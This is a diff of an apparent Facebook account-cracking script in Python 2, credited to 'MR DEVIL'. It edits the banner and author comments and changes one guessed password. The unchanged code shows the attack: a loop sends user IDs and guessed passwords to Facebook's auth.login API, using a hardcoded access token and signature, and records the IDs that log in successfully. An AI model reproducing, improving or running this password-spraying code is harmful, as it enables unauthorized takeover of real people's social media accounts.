@@ -1,6 +1,6 @@
 #coding:utf-8
 #!/user/bin/python2
-#coding by MŘ ĐĚVĮŁ 
+#coding by MR DEVIL
 try:    
     import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
     from multiprocessing.pool import ThreadPool
@@ -44,21 +44,21 @@ S='\033[1;96m'
 P='\033[1;95m'
 Y='\033[1;93m'
 
-#Dev:MŘ ĐĘVÎĽ
+#Dev:MR DEVIL
 ####LOGO  ####
-logo =                 ⁣༒☠︎𓆩‎ᗪℯ𝓿ꪱ͛ł𓆪☠︎༒
+logo = """
 \033[1;94m  ╔══ ═════ ═ ═════ ════╗
-\033[1;91m  ║ Created By:Devil 007  ║         
-\033[1;92m  ║   Owner:Devil King       ║
-\033[1;93m  ║      Owner of Devil         ║
-\033[1;95m  ║   Hunter Boyz On fire   ║
-\033[1;97m  ║           MR DEVIL             ║
+\033[1;91m  ║ Created By:Devil 007         ║         
+\033[1;92m  ║   Owner:Devil King           ║
+\033[1;93m  ║      Owner of Devil          ║
+\033[1;95m  ║   Hunter Boyz On fire        ║
+\033[1;97m  ║         MR DEVIL             ║
 \033[1;94m  ╚══ ═════ ══ ════ ════╝                       
 \033[1;96m  ▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓   ▓▓▓
-\033[1;94m     ✾    ᎡᎪᎷᏃᎪN ᎷᏌᏴᎪᎡᎪK   ✾    
-\033[1;92m      ✾  ❁❦❦❦❦❦❦❦❦❦❦❦❦❁ ✾
-\033[1;93m     ✾     Đ_Ě_V_Į_Ł       Ķ_Ī_Ň_Ğ    ✾   
-\033[1;95m     ✾      ❦❦❦❦❦❦❦❦❦❦❦❦      ✾
+\033[1;94m     ✾   ᎡᎪᎷᏃᎪN ᎷᏌᏴᎪᎡᎪK  ✾    
+\033[1;92m     ✾  ❁❦❦❦❦❦❦❦❦❦❦❦❦❁  ✾
+\033[1;93m     ✾   Đ_Ě_V_Į_Ł Ķ_Ī_Ň_Ğ  ✾   
+\033[1;95m     ✾    ❦❦❦❦❦❦❦❦❦❦❦❦   ✾
 \033[1;94m  ▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓   ▓▓▓
 \033[1;96m 
 \033[1;97m                                                 
@@ -306,7 +306,7 @@ def crapil():
 		                            ok.close()
 		                            oks.append(uid)
 		                        else:
-		                            pass4="n786786"
+		                            pass4="name123"
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
